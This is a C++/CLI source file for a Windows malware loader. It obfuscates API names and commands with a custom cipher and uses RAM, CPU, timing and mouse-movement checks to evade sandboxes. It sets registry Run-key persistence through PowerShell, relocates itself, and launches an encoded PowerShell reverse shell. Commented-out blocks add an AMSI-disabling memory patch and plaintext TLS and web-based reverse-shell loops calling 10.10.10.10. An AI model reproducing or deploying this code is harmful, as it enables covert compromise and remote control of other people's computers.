#include <Winsock2.h>
#include <Windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <sysinfoapi.h>
#include <cmath>
#include <chrono>
#include <thread>
#include <algorithm>
#include <numeric>
#include <random>
#include <shellapi.h>
#include <filesystem>
#include <vcclr.h>
#include <psapi.h>
#include <tlhelp32.h>
#using <mscorlib.dll>
#using <System.dll>
#using <System.Management.Automation.dll>
/*
typedef NTSTATUS(*NTAPI aNtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PULONG NumberOfBytesToProtect,
    IN ULONG NewAccessProtection,
    OUT PULONG OldAccessProtection);

#define syscallNum1 0x50

PVOID returnAddress() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    return GetProcAddress(ntdll, "NtProtectVirtualMemory");
}

NTSTATUS IndirectNtProtectVirtualMemory(PVOID fileHandle, HANDLE ProcessHandle, PVOID* BaseAddress, PULONG NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) {
    aNtProtectVirtualMemory pProtectVirtualMemory = (aNtProtectVirtualMemory)fileHandle;
    return pProtectVirtualMemory(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
}*/




using namespace System;
using namespace System::Management::Automation;

void RunPowerShell(LPCWSTR s)
{
    PowerShell::Create()->AddScript(gcnew String(s))->Invoke();
    //std::wcout << s << std::endl;
}


std::wstring StringToWString(const std::string& str) {
    if (str.empty()) return L"";
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

std::string WStringToString(const std::wstring & wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}


void trigStuff(int iterations) {
    volatile double dummyValue = 0.0;

    for (int i = 0; i < iterations; ++i) {
        double angle = static_cast<double>(i) * 0.01;
        dummyValue += std::sin(angle) * std::cos(angle) + std::sqrt(std::abs(angle));
    }
    (void)dummyValue;
}


std::vector<std::string> obfAlpha = { "apple", "banana", "cherry", "database", "elephant", "falcon", "galaxy", "horizon", "igloo", "jaguar", "kangaroo", "lantern", "matrix", "neuron", "octane", "phantom", "quantum", "radar", "shadow", "titanium", "universe", "vortex", "wisdom", "xenon", "yogurt", "zephyr", "Avalanche", "Blizzard", "Cyclone", "Diamond", "Eclipse", "Firewall", "Glacier", "Hurricane", "Iceberg", "Jupiter", "Kinetic", "Lightning", "Moonlight", "Nebula", "Oceanic", "Pinnacle", "Quasar", "Radiant", "Sapphire", "Tornado", "Uutrium", "Velocity", "Wavelength", "Xylophone", "Yosemite", "Zenith", "1st", "2nd", "3rd", "4th", "5th", "6th", "7th", "8th", "9th", "0th", "!excleamation", "@meneation", "#hashadtag", "$dolleasar", "%perceeadnt", "^careaset", "&ampeasfrsafnd", "*asteasfdasdrisk", "(parenaweadsasfthesis", ")closweasdfe_bracket", "-daawfsh", "=equeasals", "\\bacakfdslash", "/slaasdfash", ".dwdot", "'ap2osteropfhe", "\"thingy", " space", ":omfd" };

std::string deObfAlpha(std::vector<std::string> vec) {
    std::string buf;
    for (size_t i = 0; i < vec.size(); i++) {
        buf += vec[i].front();
    }
    return buf;
}

std::vector<int> vectorDivide(std::vector<int> input, int coefficient) {
    std::vector<int> product = input;
    for (size_t i = 0; i < product.size(); i++) {
        product[i] /= coefficient;
    }
    return product;
}

std::string orgStr(const std::string& alpha, const std::vector<int>& obj) {
    std::string str;
    for (size_t i = 0; i < obj.size(); i++) {
        if (obj[i] >= 0 && static_cast<size_t>(obj[i]) < alpha.length()) {
            str += alpha[obj[i]];
        }
    }
    return str;
}

std::string decryptCaesar(const std::string& ciphertext, const std::string& alphabet, int key) {
    std::string plaintext;
    size_t algoLength = alphabet.length();
    for (size_t i = 0; i < ciphertext.length(); i++) {
        char target = ciphertext[i];
        size_t pos = alphabet.find(target);
        if (pos != std::string::npos) {
            size_t newPos = (pos - key % algoLength + algoLength) % algoLength;
            plaintext += alphabet[newPos];
        }
        else {
            plaintext += target;
        }
    }
    return plaintext;
}

std::string talbotDecrypt(std::vector<int> input, int caeserCipher, int coefficient) {
    std::string alphabet = deObfAlpha(obfAlpha);
    std::vector<int> product = vectorDivide(input, coefficient);
    std::string vWord = orgStr(alphabet, product);
    std::string cWord = decryptCaesar(vWord, alphabet, caeserCipher);
    return cWord;
}

long long slow_fibonacci(volatile int n) {
    if (n <= 1) {
        return n;
    }
    return slow_fibonacci(n - 1) + slow_fibonacci(n - 2);
}

std::vector<int> rws2_32 = { 667, 551, 1566, 1595, 1566, 2233, 116, 348, 348, };
std::vector<int> rkernel32 = { 319, 145, 522, 406, 145, 348, 1595, 1566, 2233, 116, 348, 348, };
std::vector<int> rshell32 = { 437, 184, 115, 276, 276, 1265, 1242, 1771, 92, 276, 276, };
std::vector<int> rGlobalMemoryStatusEx = { 2706, 984, 1230, 164, 82, 984, 3198, 410, 1066, 1230, 1476, 2050, 3690, 1640, 82, 1640, 1722, 1558, 2542, 1968, };
std::vector<int> rGetSystemInfo = { 2211, 335, 1340, 3015, 1675, 1273, 1340, 335, 871, 2345, 938, 402, 1005 };
std::vector<int> r1024 = { 2703, 3162, 2754, 2856 };
std::vector<int> r2048 = { 12420, 14260, 12880, 13800 };
std::vector<int> r45 = { 112, 114 };
std::vector<int> rGetSystemMetrics = { 66, 10, 40, 90, 50, 38, 40, 10, 26, 78, 10, 40, 36, 18, 6, 38 };
std::vector<int> rSleep = { 225, 60, 25, 25, 80 };
std::vector<int> rGetCursorPos = { 6699, 1015, 4060, 5887, 4263, 3654, 3857, 3045, 3654, 8526, 3045, 3857 };
std::vector<int> ruser32 = { 18963, 17157, 4515, 16254, 49665, 48762, 69531, 3612, 10836, 10836 };
std::vector<int> ramsi = { 903, 11739, 17157, 8127, 69531, 3612, 10836, 10836 };
std::vector<int> rAmsiScanBuffer = { 55971, 26949, 39387, 18657, 93285, 6219, 2073, 29022, 58044, 43533, 12438, 12438, 10365, 37314 };
std::vector<int> rVirtualProtect = { 14496, 2718, 5436, 6040, 6342, 302, 3624, 12684, 5436, 4530, 6040, 1510, 906, 6040 };
std::vector<int> persis1 = { 135, 15, 60, 219, 105, 60, 15, 39, 126, 54, 45, 48, 15, 54, 60, 75, 240, 219, 126, 3, 60, 24, 240, 237, 102, 111, 87, 141, 0, 225, 135, 45, 18, 60, 69, 3, 54, 15, 225, 117, 27, 9, 54, 45, 57, 45, 18, 60, 225, 147, 27, 42, 12, 45, 69, 57, 225, 87, 63, 54, 54, 15, 42, 60, 144, 15, 54, 57, 27, 45, 42, 225, 132, 63, 42, 237, 240, 219, 120, 3, 39, 15, 240, 237, 135, 15, 9, 63, 54, 27, 60, 75, 87, 15, 54, 60, 237, 240, 219, 144, 3, 36, 63, 15, 240, 234, 237, 48, 45, 69, 15, 54, 57, 24, 15, 36, 36, 231, 15, 72, 15, 240, 219, 240, 147, 27, 42, 12, 45, 69, 135, 60, 75, 36, 15, 240, 102, 27, 12, 12, 15, 42, 240, 219, 240, 96, 27, 36, 15, 240, 237 };
std::vector<int> persis2 = {237, 234 };
std::vector<int> newFolder = { 800, 100, 460, 1460, 700, 400, 100, 260, 1600, 1460, 840, 20, 400, 160, 1600, 1580, 1320, 100, 280, 440, 0, 760, 820, 580, 540, 760, 540, 840, 840, 600, 540, 920, 540, 1500, 600, 100, 40, 420, 140, 1600, 940, 400, 180, 240, 380, 1580, 1600, 1460, 700, 400, 100, 260, 920, 500, 320, 100, 1600, 600, 180, 360, 100, 60, 400, 300, 360, 500 };
std::vector<int> move1 = { 3198, 1230, 1804, 410, 5986, 2870, 1640, 410, 1066, 6560, 5986, 3444, 82, 1640, 656, 6560 };
std::vector<int> move2 = { 6560, 5986, 2460, 410, 1558, 1640, 738, 1148, 82, 1640, 738, 1230, 1148, 6560, 6478, 5412, 410, 1148, 1804, 0, 3116, 3362, 2378, 2214, 3116, 2214, 3444, 3444, 2460, 2214, 3772, 2214, 6150, 2460, 410, 164, 1722, 574, 6560, 3854, 1640, 738, 984, 1558, 6150, 1722, 1148, 738, 1148, 1558, 1640, 82, 984, 984, 6314, 410, 1968, 410, 6478 };
std::vector<int> quote = {6478};
std::vector<int> runinstall = { 105, 70, 45, 70, 95, 100, 5, 60, 60, 385, 25, 120, 25 };
std::vector<int> rStart = { 900, 400, 20, 360, 400, 1460, 840, 360, 300, 60, 100, 380, 380, 1600, 1460, 640, 180, 240, 100, 840, 20, 400, 160, 1600, 1580, 1320, 100, 280, 440, 0, 760, 820, 580, 540, 760, 540, 840, 840, 600, 540, 920, 540, 1500, 600, 100, 40, 420, 140, 1600, 940, 400, 180, 240, 380, 1500, 420, 280, 180, 280, 380, 400, 20, 240, 240, 1540, 100, 480, 100, 1580 };
std::vector<int> reverseShell = { 320, 300, 460, 100, 360, 380, 160, 100, 240, 240, 1600, 1460, 280, 300, 320, 1600, 1460, 60, 1600, 1580, 800, 100, 400, 1540, 900, 100, 360, 440, 180, 60, 100, 840, 300, 180, 280, 400, 780, 20, 280, 20, 140, 100, 360, 0, 0, 900, 100, 360, 440, 100, 360, 580, 100, 360, 400, 180, 120, 180, 60, 20, 400, 100, 960, 20, 240, 180, 80, 20, 400, 180, 300, 280, 580, 20, 240, 240, 40, 20, 60, 220, 1600, 1480, 1600, 1600, 1320, 400, 360, 420, 100, 1600, 1600, 460, 160, 180, 240, 100, 1600, 1420, 1320, 400, 360, 420, 100, 1440, 1600, 1600, 400, 360, 500, 1600, 1600, 1320, 460, 1600, 1480, 1600, 800, 100, 460, 1600, 1460, 1600, 820, 40, 200, 100, 60, 400, 1600, 800, 100, 400, 1540, 980, 100, 40, 580, 240, 180, 100, 280, 400, 1600, 1320, 460, 1540, 680, 100, 20, 80, 100, 360, 380, 1540, 540, 80, 80, 1420, 1560, 940, 380, 100, 360, 1460, 540, 140, 100, 280, 400, 1560, 1600, 1560, 780, 300, 520, 180, 240, 240, 20, 1520, 1140, 1540, 1240, 1560, 1440, 1600, 1320, 60, 260, 80, 1600, 1480, 1600, 1320, 460, 1540, 600, 300, 460, 280, 240, 300, 20, 80, 900, 400, 360, 180, 280, 140, 1420, 1560, 160, 400, 400, 320, 380, 0, 1520, 1520, 1060, 1240, 1540, 1060, 1240, 1540, 1060, 1240, 1540, 1060, 1560, 1440, 1600, 180, 120, 1600, 1420, 1320, 60, 260, 80, 1600, 1460, 1600, 100, 340, 1600, 1560, 100, 480, 180, 400, 1560, 1440, 1600, 1600, 40, 360, 100, 20, 220, 1600, 1600, 180, 120, 1600, 1420, 1320, 60, 260, 80, 1440, 1600, 1600, 1320, 360, 100, 380, 1600, 1480, 1600, 1420, 180, 100, 480, 1600, 1320, 60, 260, 80, 1600, 1080, 1600, 1600, 1380, 1060, 1600, 1600, 820, 420, 400, 1600, 1460, 1600, 900, 400, 360, 180, 280, 140, 1440, 1600, 1320, 460, 1540, 940, 320, 240, 300, 20, 80, 900, 400, 360, 180, 280, 140, 1420, 1560, 160, 400, 400, 320, 380, 0, 1520, 1520, 1060, 1240, 1540, 1060, 1240, 1540, 1060, 1240, 1540, 1060, 1240, 1560, 1600, 1320, 360, 100, 380, 1440, 1600, 1600, 1600, 60, 20, 400, 60, 160, 900, 400, 20, 360, 400, 1600, 1460, 1600, 900, 240, 100, 100, 320, 1600, 1460, 1600, 380, 1600, 1140, 1600, 1580 };
std::vector<int> rsocket = { 513, 405, 81, 297, 135, 540 };
std::vector<int> rfreeaddrinfo = { 162, 486, 135, 135, 27, 108, 108, 486, 243, 378, 162, 405 };
std::vector<int> rgetaddrinfo = { 189, 135, 540, 27, 108, 108, 486, 243, 378, 162, 405 };
std::vector<int> rconnect = { 81, 405, 378, 378, 135, 81, 540 };
std::vector<int> rrecv = { 36, 10, 6, 44 };
std::vector<int> rclosesocket = { 6, 24, 30, 38, 10, 38, 30, 6, 22, 10, 40 };
std::vector<int> rWSACleanup = { 98, 90, 54, 58, 24, 10, 2, 28, 42, 32 };









typedef BOOL(WINAPI* aGlobalMemoryStatusEx)(LPMEMORYSTATUSEX lpBuffer);
typedef VOID(WINAPI* aGetSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
typedef int(WINAPI* aGetSystemMetrics)(int nIndex);
typedef VOID(WINAPI* aSleep)(DWORD dwMilliseconds);
typedef BOOL(WINAPI* aGetCursorPos)(LPPOINT lpPoint);
typedef BOOL(WINAPI* aVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef int(WSAAPI* aWSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* aSocket)(int af, int type, int protocol);
typedef addrinfo* (WSAAPI* agetaddrinfo)(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA* pHints, PADDRINFOA* ppResult);
typedef void(WSAAPI* afreeaddrinfo)(addrinfo* pAddrInfo);
typedef int(WSAAPI* aconnect)(SOCKET s, const sockaddr* name, int namelen);
typedef int(WSAAPI* arecv)(SOCKET s, char* buf, int len, int flags);
typedef int(WSAAPI* acloseSocket)(SOCKET s);
typedef int(WSAAPI* aWSACleanup)();
typedef int(WINAPI* aShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
typedef int(WINAPI* aShellExecuteW)(HWND hwnd, LPCWSTR lpOperation, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, INT nShowCmd);
typedef SOCKET(WSAAPI* psocket)(int af, int type, int protocol);



HMODULE ws2_32 = LoadLibraryA(talbotDecrypt(rws2_32, 1, 29).c_str());
HMODULE kernel32 = LoadLibraryA(talbotDecrypt(rkernel32, 1, 29).c_str());
HMODULE shell32 = LoadLibraryA(talbotDecrypt(rshell32, 1, 23).c_str());
HMODULE user32 = LoadLibraryA(talbotDecrypt(ruser32, 1, 903).c_str());

aGlobalMemoryStatusEx pGlobalMemoryStatusEx = (aGlobalMemoryStatusEx)GetProcAddress(kernel32, talbotDecrypt(rGlobalMemoryStatusEx, 1, 82).c_str());
aGetSystemInfo pGetSystemInfo = (aGetSystemInfo)GetProcAddress(kernel32, talbotDecrypt(rGetSystemInfo, 1, 67).c_str());
aGetSystemMetrics pGetSystemMetrics = (aGetSystemMetrics)GetProcAddress(user32, talbotDecrypt(rGetSystemMetrics, 1, 2).c_str());
aSleep pSleep = (aSleep)GetProcAddress(kernel32, talbotDecrypt(rSleep, 1, 5).c_str());
aGetCursorPos pGetCursorPos = (aGetCursorPos)GetProcAddress(user32, talbotDecrypt(rGetCursorPos, 1, 203).c_str());
aVirtualProtect pVirtualProtect = (aVirtualProtect)GetProcAddress(kernel32, talbotDecrypt(rVirtualProtect, 1, 302).c_str());
aSocket pSocket = (aSocket)GetProcAddress(ws2_32, talbotDecrypt(rsocket, 1, 27).c_str());
agetaddrinfo pGetAddrInfo = (agetaddrinfo)GetProcAddress(ws2_32, talbotDecrypt(rgetaddrinfo, 1, 27).c_str());
afreeaddrinfo pFreeAddrInfo = (afreeaddrinfo)GetProcAddress(ws2_32, talbotDecrypt(rfreeaddrinfo, 1, 27).c_str());
aconnect pConnect = (aconnect)GetProcAddress(ws2_32, talbotDecrypt(rconnect, 1, 27).c_str());
arecv pRecv = (arecv)GetProcAddress(ws2_32,talbotDecrypt(rrecv, 1, 2).c_str());
acloseSocket pCloseSocket = (acloseSocket)GetProcAddress(ws2_32, talbotDecrypt(rclosesocket, 1, 2).c_str());
aWSACleanup pWSACleanup = (aWSACleanup)GetProcAddress(ws2_32, talbotDecrypt(rWSACleanup, 1, 2).c_str());

// talbotDecrypt(rVirtualProtect, 1, 302);



bool hasLessThan4GBRAM() {
    MEMORYSTATUSEX status;
    status.dwLength = sizeof(status);

    if (pGlobalMemoryStatusEx(&status)) {
        DWORDLONG fourGB = 4ULL * 1024 * 1024 * 1024;
        return status.ullTotalPhys < fourGB;
    }
    else {
        return 1;
    }

    return false;
}


void JitterSleep(DWORD baseMs, DWORD jitterPercent) {
    if (baseMs == 0) return;
    std::random_device rd;
    std::mt19937 gen(rd());

    double variance = (double)jitterPercent / 100.0;
    double minMultiplier = 1.0 - variance;
    double maxMultiplier = 1.0 + variance;

    std::uniform_real_distribution<double> dis(minMultiplier, maxMultiplier);

    int randomizedMs = (int)baseMs * dis(gen);

    /* LONGLONG relativeIntervals = (LONGLONG)(randomizedMs * -10000.0);

     LARGE_INTEGER li;
     li.QuadPart = relativeIntervals;

     Sw3NtDelayExecution(FALSE, &li);*/
    pSleep(randomizedMs);
}



bool mouseIdentify() {
    int screenWidth = pGetSystemMetrics(SM_CXSCREEN);
    int screenHeight = pGetSystemMetrics(SM_CYSCREEN);
    int centerX = screenWidth / 2;
    int centerY = screenHeight / 2;
    POINT center;
    center.x = centerX;
    center.y = centerY;

    std::vector<POINT> positions;

    POINT cursorPoint;
    for (int i = 0; i < 10; i++) {
        if (pGetCursorPos(&cursorPoint)) {
            positions.push_back(cursorPoint);
        }
        /*int myInt = -1000000;
        LARGE_INTEGER li;
        li.QuadPart = myInt;

        LARGE_INTEGER* pLargeInt = &li;
        Sw3NtDelayExecution(false, pLargeInt);*/
        pSleep(100);
    }

	std::vector<POINT> uniquePositions;
    for(int i = 0; i < positions.size(); i++) {
        bool isUnique = true;
        for(int j = 0; j < uniquePositions.size(); j++) {
            if(positions[i].x == uniquePositions[j].x && positions[i].y == uniquePositions[j].y) {
                isUnique = false;
                break;
            }
        }
        if(isUnique) {
            uniquePositions.push_back(positions[i]);
        }
	}

    if (uniquePositions.size() < 2) {
        return true;
    }

    std::vector<double> angles;

    for(int i = 0; i < uniquePositions.size()-1; i++) {

			// Euclidean distance between two points: sqrt( (x2 - x1)^2 + (y2 - y1)^2 )
            double centerToFirst = std::sqrt( ((uniquePositions[i].x - center.x) * (uniquePositions[i].x - center.x)) + ((uniquePositions[i].y - center.y) * (uniquePositions[i].y - center.y)));
            double centerToNext = std::sqrt(((uniquePositions[i+1].x - center.x) * (uniquePositions[i+1].x - center.x)) + ((uniquePositions[i+1].y - center.y) * (uniquePositions[i+1].y - center.y)));
            
            double denominator = 2.0 * centerToFirst * centerToNext;
            if (denominator < 1e-6) {
                continue;
            }
            
            double firstToNext = std::sqrt(((uniquePositions[i + 1].x - uniquePositions[i].x) * (uniquePositions[i + 1].x - uniquePositions[i].x)) + ((uniquePositions[i + 1].y - uniquePositions[i].y) * (uniquePositions[i + 1].y - uniquePositions[i].y)));
            // Cosine rule: c^2 = a^2 + b^2 - 2abcos(theta)
            // cos(theta) = (a^2 + b^2 - c^2)/2ab
            // theta = arccos((a^2 + b^2 - c^2)/2ab)
            
            double cosineRule1 = ((centerToFirst * centerToFirst) + (centerToNext * centerToNext) - (firstToNext * firstToNext)) / (2 * centerToFirst * centerToNext);
            cosineRule1 = std::clamp(cosineRule1, -1.0, 1.0);
            double cosineRule = std::acos(cosineRule1);
            
            angles.push_back(cosineRule);
	}

    if (angles.size() <= 1) {
        return 0.0;
    }

    double sum = std::accumulate(angles.begin(), angles.end(), 0.0);
    double mean = sum / angles.size();

    double sq_sum = 0.0;
    for (double val : angles) {
        sq_sum += (val - mean) * (val - mean);
    }

    double denominator = angles.size() - 1;
    double variance = sq_sum / denominator;
    double standardDev = std::sqrt(sq_sum / denominator);
    std::cout << standardDev << std::endl;
    if(standardDev > 0.05) {
        return false;
	}
    return true;
}
/*
void DisableAMSI() {
    HMODULE hAmsi = LoadLibraryA(talbotDecrypt(ramsi, 1, 903).c_str());
    if (!hAmsi) return;
    JitterSleep(10000, 10);
    
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, talbotDecrypt(rAmsiScanBuffer, 1, 2073).c_str());
    if (!pAmsiScanBuffer) return;
    trigStuff(200340000);
    DWORD oldProtect;
    if (pVirtualProtect(pAmsiScanBuffer, 6, PAGE_READWRITE, &oldProtect)) {
        unsigned char obfuscated[] = {0x6B, 0x9A, 0x99};
        size_t size = sizeof(obfuscated);
        unsigned char key = 0x5A;

        HANDLE hHeap = GetProcessHeap();
        //unsigned char* patch = (unsigned char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);

        //unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; 
        
        unsigned char patch[] = {0x31, 0xC0, 0xC3};
        JitterSleep(10000, 10);
        //memcpy((void*)pAmsiScanBuffer, patch, sizeof(patch));
        memcpy((void*)pAmsiScanBuffer, patch, size);
        //SecureZeroMemory(patch, size);
        //HeapFree(hHeap, 0, patch);
        JitterSleep(100200, 10);
        pVirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
    }
    JitterSleep(10000, 10);
}*/
/*void DisableAMSI() {
    HMODULE hAmsi = LoadLibraryA(talbotDecrypt(ramsi, 1, 903).c_str());
    if (!hAmsi) return;
    JitterSleep(10000, 10);

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, talbotDecrypt(rAmsiScanBuffer, 1, 2073).c_str());
    if (!pAmsiScanBuffer) return;
    trigStuff(200340000);

    DWORD oldProtect;

    if (IndirectNtProtectVirtualMemory(pAmsiScanBuffer, 6, PAGE_READWRITE, &oldProtect)) {

        unsigned char patch[] = { 0x31, 0xC0, 0xC3 };
        JitterSleep(10000, 10);

        memcpy((void*)pAmsiScanBuffer, patch, sizeof(patch));

        JitterSleep(100200, 10);

        IndirectNtProtectVirtualMemory(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
    }
    JitterSleep(10000, 10);
}*/





int main() {
    MessageBox(NULL, L"Tar", L"Hi", NULL);
    JitterSleep(120000, 10);
    trigStuff(200340000);
    if (hasLessThan4GBRAM() != false) {
        trigStuff(100);
        return 0;
    }
    JitterSleep(30000, 50);

    SYSTEM_INFO systemInfo;
    pGetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return 0;
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    pGlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / std::stoi(talbotDecrypt(r1024, 1, 51)) / std::stoi(talbotDecrypt(r1024, 1, 51));
    if (RAMMB < std::stoi(talbotDecrypt(r2048, 1, 230))) {
        trigStuff(19203);
        JitterSleep(30000, 50);
        return 0;
    }

    JitterSleep(15000, 50);
    trigStuff(1903);
    auto old = std::chrono::system_clock::now();
    int object = slow_fibonacci(std::stoi(talbotDecrypt(r45, 1, 2)));
    auto now = std::chrono::system_clock::now();

    JitterSleep(30000, 50);

    if ((now - old) < std::chrono::milliseconds(2000)) {
        trigStuff(19023);
        return 0;
    }
    JitterSleep(30000, 50);
    if (mouseIdentify()) {
        JitterSleep(15000, 50);
        trigStuff(9221);
        return 100;
	}

    //DisableAMSI();
    //MessageBox(NULL, L"ez", L"stage1", NULL);
    wchar_t path[MAX_PATH];
    DWORD length = GetModuleFileNameW(NULL, path, MAX_PATH);
    std::wstring wPath(path);
    //MessageBox(NULL, L"ez", L"stage2", NULL);

    std::filesystem::path filePath(WStringToString(wPath));
    //JitterSleep(120000, 10);
    // RunPowerShell((std::wstring(L"Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"ekjj\" -Value '\"powershell.exe - WindowStyle Hidden - File \"") + wPath + std::wstring(L"\"'")).c_str());
    RunPowerShell((std::wstring(StringToWString(talbotDecrypt(persis1, 1, 3))) + wPath + std::wstring(StringToWString(talbotDecrypt(persis2, 1, 3)))).c_str());
    //MessageBox(NULL, L"ez", L"stage3", NULL);
    if (filePath.filename() != talbotDecrypt(runinstall, 1, 5)) {

        RunPowerShell(std::wstring(StringToWString(talbotDecrypt(newFolder, 1, 20))).c_str());
        //MessageBox(NULL, L"ez", L"stage4", NULL);
        JitterSleep(12000, 10);
        RunPowerShell((std::wstring(StringToWString(talbotDecrypt(move1, 1, 82))) + wPath + std::wstring(StringToWString(talbotDecrypt(move2, 1, 82)))).c_str());
        std::wcout << (std::wstring(StringToWString(talbotDecrypt(move1, 1, 82))) + wPath + std::wstring(StringToWString(talbotDecrypt(move2, 1, 82)))) << std::endl;
        //MessageBox(NULL, L"ez", L"stage5", NULL);
        LPCWSTR runR = std::wstring(StringToWString(talbotDecrypt(rStart, 1, 20))).c_str();
        RunPowerShell(runR);
        //MessageBox(NULL, L"ez", L"stage6", NULL);
        return 0;
    }
    JitterSleep(50000, 10);
    
    //LPCWSTR rShell = L"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('10.10.10.10', 9001);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()";
    // LPCWSTR rShell = L"powershell -nop -c \"[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; while ($true) { try { $w = New - Object Net.WebClient; $w.Headers.Add('User-Agent', 'Mozilla/5.0'); $cmd = $w.DownloadString('https://10.10.10.1'); if ($cmd - eq 'exit') { break }; if ($cmd) { $res = (iex $cmd 2 > &1 | Out - String); $w.UploadString('https://10.10.10.10', $res) } } catch{Start - Sleep - s 5} }\"";
     LPCWSTR rShell = std::wstring(StringToWString(talbotDecrypt(reverseShell, 1, 20))).c_str();
     RunPowerShell(rShell);
    /*WSADATA wsaData;
C:\Users\maste>  // LPCWSTR rShell = L"powershell -nop -c \"[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; while ($true) { try { $w = New - Object Net.WebClient; $w.Headers.Add('User-Agent', 'Mozilla/5.0'); $cmd = $w.DownloadString('https://10.10.10.1'); if ($cmd - eq 'exit') { break }; if ($cmd) { $res = (iex $cmd 2 > &1 | Out - String); $w.UploadString('https://10.10.10.10', $res) } } catch{Start - Sleep - s 5} }\"";



    WSAStartup(MAKEWORD(2,2), &wsaData);

    addrinfo addrInfo;
    addrinfo* result = nullptr;
    SOCKET connectSocket = INVALID_SOCKET;
    std::string port = "443";
    std::string ip = "";

    


    WSACleanup();*/


    
    return 0; 
}



//python syswhispers.py -m jumper_randomized -a x64 --functions NtDelayExecution -o syscalls










































